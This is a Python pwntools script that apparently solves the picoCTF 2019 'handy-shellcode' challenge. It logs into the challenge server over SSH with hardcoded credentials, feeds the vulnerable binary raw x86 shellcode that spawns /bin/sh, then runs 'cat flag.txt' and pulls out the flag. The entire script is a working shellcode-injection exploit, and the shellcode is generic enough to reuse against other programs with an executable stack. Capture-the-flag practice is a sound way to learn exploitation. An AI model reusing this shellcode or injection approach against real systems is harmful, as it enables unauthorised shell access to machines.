from pwn import *
import re

try:
    session = ssh(host="2019shell1.picoctf.com",user="cse331",password="3curityishard", level=50)
    process = session.process(cwd='/problems/handy-shellcode_4_037bd47611d842b565cfa1f378bfd8d9', executable='./vuln')
    process.sendline('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')
    process.sendlineafter('$ ', 'cat flag.txt')

    recvl = process.recv()
    flag = re.search(r"picoCTF{(.*)}", str(recvl))
    print(flag.groups()[0])
    process.close()
except:
    print('lost connection to server')
